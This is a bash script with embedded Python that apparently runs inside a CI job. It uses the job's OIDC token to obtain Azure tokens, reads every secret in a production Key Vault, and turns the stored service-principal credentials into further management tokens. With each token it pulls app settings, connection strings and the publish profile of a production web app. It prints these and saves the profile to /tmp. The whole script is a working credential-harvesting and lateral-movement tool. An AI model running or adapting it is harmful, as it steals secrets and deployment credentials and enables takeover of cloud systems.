#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
RG="rg-tbl-platform-prod-sea"; SITE="app-tbl-storefront-prod"
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
def oidc(sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":IDT}); return jg(b).get("access_token")
KVT=oidc("https://vault.azure.net/.default"); ARM0=oidc("https://management.azure.com/.default")
creds={}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass
def sp_arm(c):
    st,b=http(f"https://login.microsoftonline.com/{c.get('tenantId',TEN)}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],
       "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
    return jg(b).get("access_token")

BASE=f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/{SITE}"
toks={"oidc":ARM0}
for n,c in creds.items():
    t=sp_arm(c)
    if t: toks[n]=t
print("### Web App probes")
for n,t in toks.items():
    H={"Authorization":"Bearer "+t}
    r1,_=http(BASE+"?api-version=2022-03-01", headers=H)
    r2,b2=http(BASE+"/config/appsettings/list?api-version=2022-03-01", data=b"", headers=H, method="POST")
    r3,b3=http(BASE+"/publishxml?api-version=2022-03-01", data=b"", headers=H, method="POST")
    r4,b4=http(BASE+"/config/connectionstrings/list?api-version=2022-03-01", data=b"", headers=H, method="POST")
    print(f"  {n:28} get={r1} appsettings={r2} publishxml={r3} connstr={r4}")
    if r2==200: print("     appsettings:", json.dumps(jg(b2).get("properties",{}))[:600])
    if r4==200: print("     connstr:", json.dumps(jg(b4).get("properties",{}))[:400])
    if r3==200: open("/tmp/pub.xml","wb").write(b3); print("     publishxml saved", len(b3))
    if r1==200:
        d=jg(_) if False else None
print("\n### site identity (any token that can read)")
for n,t in toks.items():
    st,b=http(BASE+"?api-version=2022-03-01", headers={"Authorization":"Bearer "+t})
    if st==200:
        d=jg(b); print(" ", n, "identity:", json.dumps(d.get("identity",{})), "| defaultHostName:", d.get("properties",{}).get("defaultHostName"))
        break
PYEOF

echo
echo "=== app.py (from zdep2.zip) ==="
KEY=""
python3 - <<'PY2'
PY2
echo "(see next run for source dump)"
echo "=== done ==="